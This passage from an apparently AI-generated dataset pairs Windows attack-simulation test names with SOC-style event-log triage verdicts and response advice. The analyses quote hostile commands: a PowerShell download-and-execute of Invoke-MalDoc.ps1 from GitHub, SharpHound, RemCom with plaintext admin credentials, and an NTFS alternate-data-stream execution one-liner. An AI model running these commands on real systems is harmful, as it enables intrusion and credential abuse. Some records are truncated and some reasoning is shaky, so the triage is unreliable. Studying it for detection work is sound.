- The Sysmon logs correlate with the PowerShell logs, showing PowerShell being run with high integrity level and involving an admin user (`SERVER002\\admin_test`). The parent process (`wsmprovhost.exe`) is a legitimate Windows process, but the use of PowerShell to directly execute downloaded scripts in this pattern is highly suspicious.

#### 3. Process Execution:
- Multiple processes related to PowerShell (`powershell.exe`), console hosts (`conhost.exe`), and event utilities (`wevtutil.exe`) are observed in the Sysmon logs. There is a chaining of processes starting from PowerShell, indicating scripted execution which might be related to maintaining persistence or executing further steps post-initial compromise.

#### 4. Additional Legitimate Processes:
- The logs also show typical system maintenance activities, like Microsoft Edge Update processes executing (`MicrosoftEdgeUpdate.exe` and related processes). These do not appear to be suspicious as they follow typical execution paths for software updates.

### Assessment and Conclusion:
The analysis highlights a significant indicator of suspicious and potentially malicious activity - the execution of a PowerShell command to download and execute a script from an external source, suggesting the use of PowerShell as a vector for attack or compromise.

2. **Forensic Analysis**: Conduct deeper forensic investigations to trace any potential damage, data exfiltration, or further malicious installations on the host.
3. **Review and Revoke Credentials**: The executing user (`SERVER002\\admin_test`) may be compromised; review and potentially revoke related access credentials.
4. **Check for Persistence Mechanisms**: Look for potential persistence mechanisms installed by the script that could reestablish the malicious activity post-reboot or network reconnection.
5. **External Communication**: Investigate and block any unauthorized external communications to the identified URL or IP range associated with the malicious script.
6. **Review Security Controls**: Ensure endpoint protection technologies are updated and effective against PowerShell-based threats moving forward."
Command prompt writing script to file then executes it,"Based on the provided Windows event logs, let's analyze the information to identify any suspicious or anomalous behavior:

### Analysis of Logs:

1. **Security Logs**:
   - **EventID 4616**: These events record time changes by the `svchost.exe` process running as `LOCAL SERVICE`. Time changes can sometimes be an indicator of an attacker attempting to disrupt logging mechanisms. However, in this context, the change seems trivial (a few milliseconds), likely representing a normal time synchronization process. 
   
2. **Application Logs**:
   - **EdgeUpdate Service Stops**: The EdgeUpdate service stops are logged with no immediate restart noted, but this alone is not inherently suspicious. Periodic service stops for updates or maintenance can be expected.
   - **Security-SPP Event**: Managed by the system to manage licensing and could potentially have an impact if manipulated but appears routine here.

3. **Sysmon Logs**:
   - **Command Line Activity**: There are several executions involving `cmd.exe`, `whoami.exe`, and `wscript.exe`, which include scripts and command-line tools to check logged-in user information. This activity could signify an attempt to gather information about users or escalate privileges, especially given the use of `wscript` with a VBScript.
   - **Microsoft Edge Update Operations**: Numerous processes relate to updating Microsoft Edge or its components. While it could represent benign updating activity by the software itself, the volume of activity and the presence in temporary folders (`C:\\Program Files (x86)\\Microsoft\\Temp\\`) can be suspect if the machine is not expected to perform Edge updates at these times or with this volume.
   
4. **System Logs**:
   - **Time Change Events**: Similar to the Security logs, time changes are recorded, associated with the process `svchost.exe` and consistent with authorized time synchronization.

### Assessment:
- The significant volume of operations related to Microsoft Edge updates and command line invocations involving script execution (`wscript.exe`) suggests potential scripting activity or misuse. While legitimate processes and updates may trigger such events, a high frequency and use of command-line arguments in temporary directories heighten suspicion.
- The use of `wscript.exe` to execute a VBScript that checks user information via `whoami.exe` in quick succession indicates probe-type operations or potentially an attempt at recon within the system.

### Resolution: SUSPICIOUS

Given the analysis and examination of the event logs, the activity appears suspicious rather than conclusively malicious. It requires further investigation to confirm whether it constitutes a legitimate Edge update process or a potential compromise using familiar paths.

### Guidance on How to Proceed:
- **Verification of Updates**: Confirm with IT whether recent updates were scheduled or known for Microsoft Edge on this system. Check if the temporary paths used are standard for update operations.
- **Review User Activity**: Investigate the actions of user `SERVER002\\admin_test` around the times of the suspicious command executions. Look for anomalies outside typical use patterns.
- **Deep Dive on Scripts**: Analyze the script `fileTest.vbs` and any resulting activity. If possible, retrieve the script's contents for review.
- **Network Traffic Examination**: Look for any outgoing network connections or anomalies during the times logged to/from this server, particularly focusing on unusual destinations or services.

Following these steps will aid in confirming the nature of suspicious activities and determining if further containment or remediation is required."
WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique,"Based on the review of the provided Windows event logs from Sysmon, PowerShell, Application, System, and Security channels, here's a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution (Sysmon and PowerShell logs):**
   - There is a Sysmon event (EventID 1) where `powershell.exe` is run with a command that downloads and executes a PowerShell script from a suspicious external URL: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1`. This is a red flag as it indicates potential malicious activity by executing code downloaded from the internet.
   - The PowerShell logs further confirm this execution, with entries showing the initiation of several providers, indicating script execution state and activity.

2. **Use of `wevtutil.exe` and `conhost.exe` (Sysmon logs):**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` running at the same timestamp (within milliseconds of each other) suggest potential misuse. `wevtutil.exe` is often used for clearing Windows event logs, which can be part of an attacker's attempt to cover their tracks.
   - These processes were all executed under the user `SERVER002\admin_test`, which might suggest that an account with admin privileges was used, potentially compromised for malicious intent.

3. **High Integrity Level Execution:**
   - Several processes, including the `whoami.exe` and `HOSTNAME.EXE`, are running with high integrity levels. While these processes by themselves aren't inherently malicious, their parent execution context, especially when tied to the suspicious PowerShell, raises concerns about privilege misuse or elevation.

### Potential Indicators of Malicious Activity:

- The downloading and execution of scripts from an external source is an indicator of potentially malicious activity, often associated with exploitation or the establishment of persistent access.
- Repeated process executions of system utilities closely timed can be an indicator of compromised accounts or malicious automation at play.

Application uninstall using WMIC,"### Detailed Analysis of the Logs

Upon reviewing the Windows event logs provided, several points of potential interest were identified:

#### 1. Process Execution and Command-Line Usage

- **PowerShell Execution**: There are no explicit logs indicating the execution of PowerShell with possibly malicious command line arguments in the logs.
  
- **Use of `wmic.exe`**: The logs show multiple executions of `wmic.exe` with the command `wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%'"" call uninstall`. This indicates an attempt to uninstall TightVNC software locally. While this could be a legitimate administrative task, it is also a known technique used by attackers to remove remote access tools they did not install. This action occurred under the user `SERVER002\admin_test`.

- **Command Prompt Execution with `cmd.exe`**: The use of `cmd.exe` with potentially suspicious arguments correlates with the use of `wmic.exe`. This reinforces that software removal was initiated within the same timeframe under the same user context.

#### 2. Hostname and Whoami Executions

- The logs include executions of `hostname.exe` and `whoami.exe`, which themselves are benign and commonly used commands for diagnostic purposes. However, in conjunction with other operations, these may have been used to gather information about the system and user context.

#### 3. System and Application Updates

- **Microsoft Edge and Update Health Tools**: Logs show installations and updates of Microsoft Edge and Microsoft Update Health Tools. These are legitimate software maintenance activities and do not inherently suggest malicious behavior. The processes executed under `NT AUTHORITY\SYSTEM`, indicating system-level updates.

#### 4. Integrity and Privilege Observations

- All logged activities on this system were done with a high integrity level by the `SERVER002\admin_test` user account, suggesting administrative privileges. While not inherently malicious, this level of access requires ensuring that such privileges are expected for this user and context.

### Assessment and Determination

- **Potential Suspicious Activity**: The use of `wmic.exe` for uninstalling software (specifically tools like TightVNC) combined with `cmd.exe` and executed under administrative privileges is noteworthy. Such patterns can suggest either legitimate maintenance or preparation to remove traces of malicious software potentially installed by an adversary.

- **Lack of Other Malicious Indicators**: There are no additional logs showcasing obvious signs of malware execution, persistence mechanisms, or privilege escalation exploits in the Sysmon logs.

### Resolution

- **Resolution: SUSPICIOUS**

Given the execution of command-line tools for potentially removing remote management software and considering administrative access, further investigation is warranted to determine:
  - The legitimacy and intent of `wmic.exe` usage: Verify if the actions align with maintenance policies, planned software upgrades, or removal.
  - The background of the `SERVER002\admin_test` account: Confirm if the privileges and activities executed under this user are authorized and expected.

### Guidance on How to Proceed

1. **User and Intent Verification**: Confirm with the administrative team whether the actions observed were part of routine system management. Validate that the TightVNC removal matches system policies.

2. **Context Evaluation**: Assess system configuration changes around the log timestamps for unauthorized modifications.

Cobalt Strike post-exploitation pipe (before 4.2),"Upon analyzing the provided Windows event logs, I have identified several points of interest, as well as patterns that merit closer attention for potential investigation. Below is the detailed analysis of suspicious and notable events:

1. **Frequent Process Creation Using PowerShell and Cmd:**
   - A notable pattern is observed with processes executed by the user `SERVER002\admin_test`, including frequent use of `powershell.exe`, `cmd.exe`, and `wevtutil.exe`. These tools are often leveraged by attackers to carry out malicious activities once privileged access is obtained.
   - The process `cmd.exe` is seen executing `""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\build\namedpipes_executor.exe"" --pipe 5`, which points to potential command and control (C2) activity or malicious code execution, particularly when executed from temporary directories.

2. **Unusual File Activity:**
   - The process `namedpipes_executor.exe` and related executables under `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\build\` are unusual. The naming and directory structure suggest that these might not be legitimate applications. The parent-child process relationships also align with potential lateral movement or further exploitation attempts.

3. **Event Log Manipulation:**
   - The use of `wevtutil.exe` for exporting logs (`epl Microsoft-Windows-Sysmon/Operational ...`) raises a red flag, as this is a known tactic by attackers to cover tracks by clearing or exporting logs for analysis outside the monitored environment.

4. **Elevated Privileges:**
   - The Security event log (EventID 4672) indicates special privileges being assigned to the user `admin_test`. This user gains several high-level permissions such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which can be exploited in privilege escalation or unauthorized access scenarios.

5. **Unusual Network Activity:**
   - There is a logon event (EventID 4624) with Logon Type ""3"" (network logon) for the user `admin_test` from an IP (fe80::e3b5:5371:12a8:9c77) that is potentially unusual for a server environment, suggesting lateral movement or external access.

**Assessment and Guidance:**

Based on the observations, the behavior in these logs aligns with potentially suspicious activity. The presence of what appears to be unauthorized usage of administrative tools like PowerShell and cmd, execution from temporary folders, manipulation of event logs, and network logon with elevated privileges warrant further investigation. 

**Resolution:**
- **SUSPICIOUS**: These activities collectively suggest potential malicious behavior that needs in-depth investigation. 

**Next Steps:**
1. Investigate the origin and purpose of the `namedpipes_executor.exe` and related applications. Check for any associated malicious campaigns or known indicators of compromise.
2. Explore the network activities related to the suspicious IP address and validate the legitimacy of the accesses.
3. Review and verify the admin_test account activities to confirm whether they align with standard operational behavior and are authorized.
4. Monitor for any unauthorized modifications or deletions targeting logs and evaluate if security controls (e.g., AV, EDR) have reported any alerts related to these processes.

Prompt action and thorough investigation will help in determining if any critical mitigation steps are required to safeguard the system."
Run BloodHound from local disk,"Upon thorough analysis of the provided Windows event logs, here is the identification of potentially suspicious activities along with a determination of the severity:

1. **Use of PowerShell with SharpHound.ps1:**
   - Several Sysmon events indicate the execution of `PowerShell` with command lines like:
     ```powershell
     ""powershell.exe"" & {import-module \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\SharpHound.ps1\"", try { Invoke-BloodHound -OutputDirectory $env:Temp }, catch { $_; exit $_.Exception.HResult}, Start-Sleep 5}
     ```
   - The `SharpHound.ps1` script is associated with the BloodHound tool, a known tool used commonly for Active Directory enumeration in penetration testing and sometimes by malicious actors for reconnaissance.

2. **Execution Context:**
   - The PowerShell script was executed under the `SERVER002\\admin_test` account, which has a high integrity level, indicative of administrative privileges.
   - This execution context gives the power to enumerate and interact significantly with system resources, commonly necessary for reconnaissance and enumeration activities.

3. **Export of Event Logs using `wevtutil.exe`:**
   - Several instances of `wevtutil.exe` being executed, possibly indicating that event logs are being manipulated or exported:
     ```commandline
     ""C:\\Windows\\system32\\wevtutil.exe\"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx""
     ```
   - This can be indicative of potential log tampering or extraction by an attacker to cover tracks or gather further data.

4. **Security Log Events:**
   - Multiple `4672` events that indicate accounts with special privileges were used, particularly SYSTEM account actions. This is normal system behavior, however, in this context, it should be cross-referenced with other suspicious activity.
   - The combination of high privilege operations aligning with the use of a tool like BloodHound may indicate malicious reconnaissance activity.

**Conclusion:**
Based on the analysis, the use of PowerShell to run SharpHound and the manipulation or reading of logs strongly suggest potentially malicious insider activity or system compromise. This activity aligns closely with reconnaissance behaviors seen in the initial stages of a cyber attack, particularly when using tools that can map and query Active Directory environments.

**Resolution: SUSPICIOUS**

**Guidance:**
1. **Immediate Actions:**
   - Conduct a deeper investigation into the `admin_test` account for any unauthorized or anomalous activity.
   - Capture memory dump and review forensics for further artifacts of compromise.
   - Enhance monitoring on `PowerShell` activities, especially those involving scripts and modules from the user's temp directory.

2. **Long-term Mitigation:**
   - Implement stricter access controls and auditing on systems handling sensitive data.
   - Educate users about the risks and signs of such internal reconnaissance tools.
   - Review and potentially revise security policies regarding privilege management and tool usage within the organization.

Office launching .bat file from AppData,"### Detailed Analysis of the Logs:

#### Evaluation of Suspicious Activity
1. **Sysmon Events**:
   - Multiple instances of `powershell.exe` executions are observed. Specifically, Event ID: 18016 indicates the execution of PowerShell with a highly suspicious command line:
     ```
     ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing), ...}
     ```
     This command attempts to download and execute a PowerShell script (`Invoke-MalDoc.ps1`) from an external URL, which is a classic behavior of script-based attacks or malware delivery.
   
   - The subsequent command attempts to create a batch file (`ardata.bat`) to execute `calc.exe`, indicating obfuscated and potentially malicious behavior.
   
2. **PowerShell Logs**:
   - Matches the Sysmon log analysis with the PowerShell’s host application details showing the use of `Invoke-MalDoc`, confirming the download and execution attempt of remote code, suggesting malicious intent.

3. **Other Processes**:
   - Frequent execution of legitimate Windows executables like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `HOSTNAME.EXE`, associated with a single user (`SERVER002\admin_test`). 
   - While these processes themselves are legitimate, their rapid succession and association with suspicious PowerShell activity merits consideration of these as potentially being utilized as living-off-the-land techniques when executing malicious activities.

#### Indicators of Compromise (IoC)
- Execution of PowerShell scripts from external sources (`raw.githubusercontent.com`) using the `iwr` (Invoke-WebRequest) command, targeting a known repository host to download scripts.
- Use of PowerShell to download malware (e.g., `Invoke-MalDoc.ps1`), which is commonly seen in malicious campaigns.

### Assessment and Resolution
- The reviewed logs show clear indicators of malicious activity, primarily centered around the execution of potentially harmful PowerShell scripts sourced from external URLs and command line obfuscation typical in attacks.
- Given the observed behavior, this is not mere suspicious activity needing further investigation — it clearly aligns with known patterns of compromise through script execution.

**Resolution**: MALICIOUS

### Guidance on Next Steps:
1. **Immediate Incident Response**:
   - Quarantine the affected host `Server002` to prevent further spread or communication with potential command-and-control (C2) servers.
   - Conduct a detailed forensic analysis of `Server002` to uncover additional compromise indicators and understand the full extent of the breach.

2. **Containment and Eradication**:
   - Terminate all unauthorized or suspicious processes running on the system.
   - Remove all files, scripts, or malware payloads associated with this event.

3. **Preventive Measures**:
   - Review and adjust PowerShell execution policies. Implement logging and script block logging for PowerShell activities on critical systems.
   - Audit and restrict network access to prevent unauthorized external connections.
   - Monitor and control the execution of PowerShell scripts through extensive access controls and behavioral monitoring.

4. **Awareness and Training**:
   - Conduct security awareness training for users to recognize and report suspicious activities.
"
Use RemCom to execute a command on a remote host,"Based on the provided Sysmon logs, we have several key points that stand out regarding potential malicious activities:

1. **Use of PowerShell (EventRecordID: 18003)**: PowerShell is a powerful scripting language often leveraged by attackers to execute scripts or commands. While the execution of PowerShell itself is not necessarily malicious, its usage by the ""admin_test"" user, who may not typically need to run it with elevated privileges, is worth noting. 

2. **Execution of Suspicious Processes (EventRecordID: 18033, 18035, 18036)**:
   - Execution of `cmd.exe` with arguments involving `remcom.exe` (a tool for remote command execution), along with passing Windows credentials (`/user:Administrator /pwd:P@ssw0rd1`). This could indicate an attempt at unauthorized remote execution or lateral movement, suggesting potential compromise.
   - Execution of `remcom.exe` and `ProcComs.bin` could be indicative of a malicious payload or tool meant for persistence or further monitoring/control of the system.

3. **Use of Administrator Credentials**:
   - The command line used in EventRecordID 18033 contains hardcoded credentials, which is a significant security risk. Not only does this confirm an attempt to leverage administrative access, but the presence of such credentials in plain text suggests potential exposure to unauthorized users or scripts.
   
4. **Tool Usage and Parent-Child Relationships**:
   - `remcom.exe` and `ProcComs.bin` are observed running on the system, linked to administrative actions.
   - These processes stem from shell commands (`cmd.exe`) initiated via an account with elevated privileges, which could suggest exploitation or mishandling of user rights.

5. **System Services Execution**:
   - Normal system operations, like updates and service management (`MicrosoftEdgeUpdate.exe`, and `svchost.exe` processes), seem benign and part of routine system handling. However, juxtaposed with suspicious manual executions could indicate camouflage tactics sometimes employed during unauthorized system modifications.

**Assessment**:
The patterns in the logs, particularly the use of system tools for suspected remote administration activities, suggest actions aligned with typical tactics of an attacker leveraging administrative capabilities. Given the use of tools like `remcom.exe` and the improper handling of credentials, this activity is strongly indicative of malicious intent.

**Resolution**: MALICIOUS

**Guidance**:
- Immediate containment of the host device (Server002) is advised to prevent further unauthorized access or data exfiltration.
- Conduct a thorough audit of administrative accounts, ensure password policies are enforced, and change any exposed credentials.
- Review privilege allocations, especially for the ""admin_test"" account identified in the logs.
- Implement monitoring solutions that flag unexpected administrative actions or the execution of common utilities in user contexts not typically associated with those operations.
- Consider running a comprehensive malware scan to detect and remove potential threats.
- Check for other signs of compromise across the network to ensure that this is not part of a larger attack campaign."
Execute PowerShell script via Word DDE,"**Detailed Analysis of the Logs:**

**Suspicious or Anomalous Behavior:**

1. **EdgeUpdate Service Stop:**
   - There are two entries in the Application log indicating that the ""edgeupdate"" service stopped on ""Server002."" This may be part of normal operations if it's updating Edge but could also be an indicator of stopping a service for malicious reasons.
  
2. **Usage of Microsoft Tools:**
   - Several Sysmon logs indicate the execution of Microsoft's utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`), which are consistent with potential reconnaissance or persistence technique by attackers. Specifically, `cmd.exe` executed with a command to open a temporary file `DDE_Document.docx` located in a temp directory is suspicious as it could be used for malicious document execution or persistence.

3. **Usage of EdgeUpdate:**
   - Multiple executions related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86`, `MicrosoftEdgeUpdateComRegisterShell64`) are noted, which could be indicative of either legitimate update activity or misuse by malicious actors to masquerade malicious activity under the guise of legitimate processes.

4. **System Time Manipulation:**
   - Time changes are reflected in the System log, which are indicators often associated with altering logs or creating confusion within logs, though these could also be legitimate adjustments by the time service.

5. **Security Log Anomalies:**
   - Several failed attempts to access resources via Microsoft Account are logged (Event 5379) with return code 3221226021, indicative of failed authentication attempts. This could be legitimate or signs of attempted unauthorized access.

**Assessment:**

- **Command Usage:** The use of legitimate system utilities in quick succession and the attempted opening of a document file via `cmd.exe` with an unusual path is an indicator of potential suspicious activity that warrants further investigation.
  
- **Frequent Process Activity:** The repeated launch and chaining of processes that should otherwise not interact, such as the Edge Update processes running in sequence and other utilities being used as part of a batch, could indicate scripting for malicious intent.

- **Security Log and System Anomalies:** Anomalies in time adjustments and failed Microsoft Account logins suggest potential preparation or cover-up for other actions that are not benign.

**Guidance:**

- **Deep Dive Analysis:** Perform a deeper forensic analysis on `Server002` focusing on the ""admin_test"" user's activities and processes that spawn from `cmd.exe` to determine if the `DDE_Document.docx` involves any payloads or scripts.
  
- **EdgeUpdate Entries Verification:** Verify the legitimacy of EdgeUpdate paths and compare process hash values against trusted threat intelligence feeds to rule out tampering.

- **Account Activity Review:** Investigate failed login attempts linked to ""MicrosoftAccount:user=02txoixylodcstop"" to determine if they correlate with unauthorized access attempts.

**Resolution: SUSPICIOUS**

The activities and patterns found, while possibly benign under normal circumstances, collectively present a scenario requiring further investigation to eliminate the risk of unauthorized or malicious activities."
WMI Execute Local Process,"Let's meticulously analyze the provided logs to identify any indicators of suspicious or malicious activity.

**Sysmon Log Analysis:**

1. **Processes Executed:**
   - The logs document several processes executed around the same timeframe (October 22, 2024, at 15:09 UTC).
   - Common administrative commands and processes such as `whoami.exe`, `wmic.exe`, `wevtutil.exe`, and `cmd.exe` were run by the user `SERVER002\admin_test`.
   - The execution of `cmd.exe /c wmic process call create notepad.exe` appears unusual. The Windows Command Processor (`cmd.exe`) was used to invoke the Windows Management Instrumentation Command-line (WMIC) to create a `notepad.exe` process. Although launching Notepad itself is benign, using `wmic` to do so is unorthodox. This method of process creation could potentially signify an automation attempt or scripting activity.
   - Additionally, there are multiple executions of `wevtutil.exe` by `admin_test`. While `wevtutil.exe` is used for event log management, its execution alongside other administrative tools could suggest an effort to clean up or manipulate event logs.

2. **Other Applications:**
   - Execution of `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe` and related setup files linked with Microsoft Edge installation/update activities and performed by `NT AUTHORITY\SYSTEM` suggests that automatic updates took place. This is typical behavior for system application maintenance.

3. **Integrity Level and User Account:**
   - Many of these processes are executed at a high integrity level, consistent with administrative privilege usage.
   - The responsible user for these activities is `SERVER002\admin_test`, which seems to be a test or administrative account.

**Application Log Analysis:**

- The events related to Microsoft-Windows-Security-SPP suggest activities around Software Protection Platform Service, which are routine and do not indicate an issue.

**Assessment:**

The activities around the use of `cmd.exe` and `wmic` to spawn Notepad, in conjunction with frequent use of `wevtutil.exe`, warrant further investigation:
- The use of `wmic` to create processes could be scripted automation. While not inherently malicious, this approach of invoking processes may imply testing or probing actions that aren't typical for standard user operation.
- Frequent use of `wevtutil.exe` can be indicative of log tampering or attempts to alter visibility of actions taken on the system.

**Resolution: SUSPICIOUS**

Given the combination of administrative tool usage, particularly `wmic` for process creation and the `wevtutil` executions, this could either be benign administrative maintenance/testing activity or an initial stage of compromise that demands closer scrutiny.

**Guidance:**

1. **Investigate User Activity:**
   - Investigate the `SERVER002\admin_test` account for legitimacy and usual behavior patterns. Identify if this is an authorized account and check for any recent anomalies in its usage patterns.

2. **Review Commands:**
   - Conduct a deeper review of command-line history and scripts associated with this account to determine the purpose of the `cmd.exe` and `wmic` invocations.

3. **Check for Log Manipulation:**
   - Verify the integrity of system and application logs to ensure they haven't been tampered with, especially focusing around the suspect times.

4. **Monitor and Alert:**
   - Set up monitoring and alerts for unusual activity, related to both the admin_test account and the specific command-line uses observed, such as `cmd.exe` or `wmic.exe`.

To conclude, while there is no definitive proof of malicious activity, the log entries and invoked actions merit further investigation to rule out the potential for compromise."
Potentially Unwanted Applications (PUA),"Based on the analysis of the provided event logs, here's a summarized assessment of activity that stands out:

1. **PowerShell Activity**:
   - Multiple PowerShell events (EventID 600, 400, 403) show execution of a command involving `Invoke-WebRequest` to download an executable (`PotentiallyUnwanted.exe`) from `http://amtso.eicar.org`.
   - This behavior is highly suspicious as PowerShell is being used to download and execute a file directly from the internet. The URL `amtso.eicar.org` is known to be associated with security testing files, commonly used to test the response of security software. Though it could be related to testing, the download and execution pattern is concerning.

2. **Sysmon Activity**:
   - Several Sysmon process creation events (EventID 1 and 5) show the execution of the downloaded file (`PotentiallyUnwanted.exe`) with high integrity level by the user `SERVER002\\admin_test`.
   - The execution chain also includes PowerShell and we'vevtutil execution, which aligns with potential malicious behavior often seen in compromise scenarios.

3. **Security and System Logs**:
   - Activity in logs such as Windows Defender updates (EventID 19) suggests that the system is performing usual security intelligence updates, which is normal behavior.
   - No direct privilege escalation or attempts to manipulate the system processes, beyond the suspicious PowerShell activity.

**Threat Assessment**:
- **Primary Concern**: The PowerShell script downloads and executes a potentially unwanted executable, simulating behavior common in malware infections. Despite the site being associated with a security test, it doesn't guarantee the activity is benign, especially without proper context or intent verification from the user/administrator.
- **Risk**: Executing untrusted executable files can lead to unwanted system behavior, compromise or reveal vulnerabilities in the system's security posture.

**Resolution**: 
- **SUSPICIOUS**: This activity appears abnormal relative to typical system operations and is suspicious enough to warrant further investigation. While the downloaded executable may align with security testing (via EICAR test scenarios), without explicit confirmation of testing, this pattern resembles malicious behavior.
  
**Guidance**:
- **Verification and Context Confirmation**: Confirm with system administrators or responsible parties if this activity was authorized and part of scheduled security testing.
- **Additional Monitoring**: Implement monitoring of PowerShell and network connections to prevent unauthorized downloads and executions.
- **Review Security Protocols**: Ensure scripts, especially those involving web requests or executable downloads, are scrutinized and executed under controlled conditions.
- **User Awareness**: Educate users about the responsibilities when running scripts from potentially compromising sources. 

Further action should involve blocking unverified downloads and continuously monitoring for new related incidents."
ESXi - Install a custom VIB on an ESXi host,"### Detailed Analysis

1. **Overview of Logs**:
   - The logs provided include entries from the System log, Application log, Sysmon log, Windows PowerShell log, and Security log.
   - The System log is empty, so we will focus on the Application, Sysmon, and Security logs.
   - The activity occurs on a host named ""Server002"".

2. **Application Log Observations**:
   - The Application log includes entries related to stopping services like `edgeupdate` and also details entry of the Software Protection Platform Service. These logs appear to be related to system updates and licensing checks – generally benign activities.
   - Windows Defender being ""ON"" is noted, which is considered healthy and typical for a protective solution.

3. **Sysmon Log Observations**:
   - Notable process creation and command execution. Activity around PowerShell, conhost.exe, and wevtutil.exe is observed.
   - Execution of cmd.exe with rather complex command that includes usage of `pscp.exe` and `plink.exe` from the PuTTY suite can be considered suspicious. These are external tools used for SCP and SSH, likely used for file transfer and remote shell commands. The command also involves credentials (`-pw pass`) potentially indicating hardcoded or poorly protected passwords.
   - Multiple instances of `MicrosoftEdgeUpdate` processes relating to system updates; however, they appear consistent with legitimate software update behavior.

4. **Security Log Observations**:
   - Several logon events and audit log settings are present. They indicate system-level activities predominantly involving the SYSTEM account on a WORKGROUP domain.
   - Recurrent use of the privilege elevation, including SeDebugPrivilege, in events like `4672` indicates processes running with high privileges.
   - `EventID 4798` shows enumeration of local group memberships, while `EventID 5379` shows credential read attempts failing consistently with a specific Microsoft Account name, this could be noise or failed attempts to get credentials, potentially indicating adverse probing.

### Suspicious Behavior and Potential Indicators of Compromise

1. **Use of External Tools `pscp.exe` and `plink.exe`**:
   - The use of these tools in file transfers and remote command execution is unusual in a server environment unless specifically accounted for. The activity should be limited strictly to administrative tasks with proper logging.

2. **Complex `cmd.exe` Use and Hardcoded Credentials**:
   - The intricate command-line execution involving potential password exposure is a cause for concern, as it may hint at unauthorized or insecure methods being implemented on the system. 

3. **Failed Credential Access**:
   - Repeated failed attempts to access certain credentials ('MicrosoftAccount:user=02txoixylodcstop') could indicate possible reconnaissance or unauthorized access attempts by an uncommented process or script.

Taking all these points into consideration, there are elements in the log entries that suggest potential misuse or suspicious behavior that requires further investigation.

### Assessment and Recommendations

- **Assessment**: **SUSPICIOUS**
  - The activity identifies potential security gaps (use of `pscp` and `plink`, hardcoded passwords, and failed credential attempts) that should be scrutinized further.
  
- **Recommendations**:
  1. **Immediate Review**: Conduct a deeper investigation into the purposes and consequences of the SCP and SSH tasks, particularly those with credentials exposed in logs.
  2. **Credential Hygiene**: Ensure that no credentials are hardcoded or stored insecurely. Implement secure storage solutions like Windows Credential Locker or similar.
  3. **Audit and Monitor**: Strengthen monitoring around critical administrative actions, especially PowerShell and command executions.
  4. **Security Posture Improvement**: Implement alerts for failed attempts to access specific credentials and verify if they are legitimate system or software requirements or misconfigured scripts or tools running on the server."
WMI Execute Remote Process,"Upon analysis of the provided event logs, here are the notable findings:

1. **Time Change Events:**
   - There are two Windows event logs with EventID 4616 in the Security log where the system time is changed. The time change is adjusted back by a few seconds. This could potentially indicate an attempt to manipulate time on the system for covering malicious activities or could be benign, resulting from legitimate system processes.
   - **Resolution:** Needs further context to determine if there's any malicious intent regarding the time change.

2. **Logon and Privilege Escalation Events:**
   - There are several logon events with EventID 4624 and privilege use events with EventID 4672 showing the user `admin_test` logging in with elevated privileges. The use of administrative level privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., needs attention, as these can be indicative of a potential privilege escalation attempt. However, if `admin_test` is a known user with expected administrative access, this may not be anomalous.
   - **Resolution:** SUSPICIOUS – Requires verification of the user's intentions and if their actions align with their roles and responsibilities.

3. **Failed Logon Attempts:**
   - There are multiple failed authentication attempts with EventID 4625 where an attempt was made to use the `Administrator` account with incorrect credentials. Frequent failed logins are often indicative of a brute force or credential stuffing attack.
   - **Resolution:** SUSPICIOUS – This should be flagged for immediate investigation to determine the source and intent behind the failed attempts.

4. **Unusual Command Line Execution:**
   - Notable is the execution of a command via `wmic` using administrator credentials (`DOMAIN\\Administrator`) to attempt to start a process (`notepad.exe`). The legitimate usage of wmic for remote command execution is common, but it being run with explicit credentials is concerning if unexpected.
   - **Resolution:** SUSPICIOUS – Requires verification if the use of these credentials and command execution is authorized.

5. **Sysmon Logs:**
   - The execution of system utilities like `wevtutil.exe` and `conhost.exe` by `admin_test` are observed. While these are common operations, they should be checked to ensure they align with regular administrative tasks.
   - **Resolution:** These activities, in the context of command executions mentioned earlier, remain SUSPICIOUS unless validated by operational procedures.

**Overall Assessment and Guidance:**
- The activities detailed in the logs suggest potentially suspicious behavior, particularly around the privilege escalation, failed logon attempts, and remote command execution utilizing administrator credentials.
- The resolution for this case is **SUSPICIOUS**, as there are multiple points requiring further investigation.
- Guidance:
  - Verify the legitimacy of `admin_test` account’s activities, including the context around privilege elevation and command execution.
  - Investigate the source and legitimacy of the failed `Administrator` account login attempts.
  - Consider implementing additional monitoring and alerts around time changes and administrative activities.
  - If unauthorized activities are confirmed, proceed to contain the user's access and conduct a detailed security incident response."
NTFS Alternate Data Stream Access,"After reviewing the provided Windows event logs, the following observations and analysis are made:

1. **PowerShell Usage:** 
   - Multiple events indicate the execution of PowerShell scripts. One specific execution stands out: 
   ```powershell
   ""powershell.exe & {Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \""Stream Data Executed\""' -Stream 'streamCommand', $streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand', Invoke-Expression $streamcommand}""
   ```
   - This command is used to manipulate and execute data stored in Alternate Data Streams (ADS) within the NTFS file system. ADS is a technique that malware often uses to hide data from standard directory listings and protection systems.

2. **User Privileges:**
   - The user `SERVER002\\admin_test` has been observed with high-level privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. These privileges can be used to bypass permissions and are often required for offensive security tasks or malicious activity.

3. **Suspicious Process Creations:**
   - There were frequent executions of `wevtutil.exe` and `conhost.exe`, along with:
